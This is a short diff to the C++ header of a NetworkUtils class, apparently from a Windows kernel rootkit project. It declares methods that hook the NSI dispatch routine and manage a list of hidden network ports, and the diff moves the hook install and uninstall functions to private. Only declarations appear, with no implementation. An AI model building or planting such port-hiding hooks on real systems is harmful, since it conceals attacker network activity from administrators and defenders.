@@ -58,6 +58,9 @@ private:
 	HiddenPorts HiddenPortsList;
 	PVOID OriginalNsiDispatchAddress;
 
+	NTSTATUS InstallNsiHook();
+	NTSTATUS UninstallNsiHook();
+
 public:
 	void* operator new(size_t size) {
 		return AllocateMemory(size, false);
@@ -71,8 +74,7 @@ public:
 	NetworkUtils();
 	~NetworkUtils();
 
-	NTSTATUS InstallNsiHook();
-	NTSTATUS UninstallNsiHook();
+	
 	bool FindHiddenPort(HiddenPort port);
 	bool AddHiddenPort(HiddenPort port);
 	bool RemoveHiddenPort(HiddenPort port);
@@ -80,7 +82,6 @@ public:
 	void QueryHiddenPorts(OutputHiddenPorts* outputHiddenPorts);
 
 	USHORT GetPortsCount() { return this->HiddenPortsList.PortsCount; }
-	bool IsCallbackActivated() { return this->CallbackActivated; }
 	PVOID GetOriginalCallback() { return this->OriginalNsiDispatchAddress; }
 };
 
